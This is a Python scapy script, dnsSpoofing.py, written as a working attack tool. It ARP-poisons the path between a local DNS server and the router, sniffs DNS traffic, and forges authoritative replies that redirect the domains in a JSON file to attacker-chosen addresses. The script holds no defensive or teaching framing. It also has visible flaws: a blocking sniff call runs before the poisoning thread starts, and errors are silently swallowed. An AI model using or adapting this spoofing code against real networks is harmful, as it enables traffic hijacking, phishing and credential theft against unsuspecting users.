import sys
from scapy.all import Ether,conf, get_if_addr,get_if_hwaddr,sendp,sniff,IP,DNS,DNSRR,UDP 
import subprocess
import getopt
import time
import signal 
import arpUtil
import threading
import json 
import os

def checkpacket(packet,listof): 
    try: 
        for i in range(packet.ancount):
            if (packet[DNSRR][i].type == 1 or packet[DNSRR][i].type == 28) : 
                for packNameAddr in  listof['currupt'] : 
                    if packet[DNSRR][i].rrname.decode(encoding="ascii") == (packNameAddr["name"] + '.') :
                        return True, packNameAddr["addr"]
    except: 
        ...
    return False ,None 


def throworkill(packet,routerMac , dnsMac , interface,listof): 
    packet[Ether].src = routerMac
    packet[Ether].dst = dnsMac
    valid , addr =  checkpacket(packet, listof)
    if valid  : 
        et = Ether(src =routerMac , dst =  dnsMac )
        ip =  IP(src=packet[IP].src,dst=packet[IP].dst)
        udp = UDP(dport=packet[UDP].dport,sport=packet[UDP].sport)
        dnsdiff= DNS(id=packet[DNS].id,qd=packet[DNS].qd,
                     aa=1,
                     qr=1,#respone 
                     an=DNSRR(rrname=packet[DNS].qd.qname,type='A',ttl=10,rdata=addr))
        packet = et/ip/udp/dnsdiff
    sendp(packet,iface=interface,verbose=False) 
   


def main()->None:
    '''
    usage: dnsSpoofing.py [-h] <dns ip> <interface>
    optional arguments:
        -h, --help          show this help message and exit
    put all the domains you want to spoof in the file -> corrupt.dns.json
    notes: 
        disable ip forwarding : "sudo sysctl -w net.inet.ip.forwarding=0"
        
        
    '''
    def dispose(*args): 
        print("dispoe")
        arpUtil.changeArpTable(options["router"], options["routerMac"], options["dnsaddr"] , options["dnsmac"],options["interface"] )
        sys.exit(0)
        
    def redoit():
        while(True):
            arpUtil.changeArpTable(options["router"], options["routerMac"], options["dnsaddr"] , options["mac"],options["interface"] )
            time.sleep(1)
            
    options = {
        "cur": None , 
        "dnsaddr": None ,  
        "dnsmac":None ,  
        "targetMac" : None,
        "routerMac" : None,
        "mac ":None , #my mac
        "ip" : None , #my ip 
    } 
   
    #### check ####
    if len(sys.argv) != 3 or   "-h" in sys.argv[1:] or "--help" in sys.argv[1:] : 
        print(main.__doc__)
        sys.exit(0)
    if "0" not in subprocess.check_output("sudo sysctl -w net.inet.ip.forwarding", shell=True).decode(encoding='ascii'): 
        print("disable ip forwarding")
        sys.exit(-1)
    if os.getuid() != 0 : 
        print(""" you are not privileged enough - try using 'sudo python3 ...' or 'su root' """)
        sys.exit(-1)
    #### check ####  
    
    #### options ####
    options["dnsaddr"]=sys.argv[1]
    options["interface"]=sys.argv[2]
    options["dnsmac"]=arpUtil.getTargetMac(options["dnsaddr"], options["interface"])
    options["router"] = next(filter(lambda x : x[3] == options["interface"] , dict(conf.route.__dict__)["routes"]))[2]
    options["routerMac"] = arpUtil.getTargetMac(options["router"], options["interface"])
    options["mac"]=get_if_hwaddr(options["interface"])
    options["ip"]= get_if_addr(options["interface"])
    options["cur"]=json.load(open("corrupt.dns.json"))
    #### options ####
    
    sniff(lfilter= lambda x : IP in x and x[IP].dst == options["dnsaddr"] , prn = lambda packet : throworkill(packet, options["routerMac"], options["dnsmac"],options["interface"],options["cur"]) )
     
    tr = threading.Thread(target=redoit)
    tr.start()
    
    signal.signal(signal.SIGINT, dispose)
    
    tr.join()
    signal.pause()
    dispose()


if __name__ == "__main__":
    main()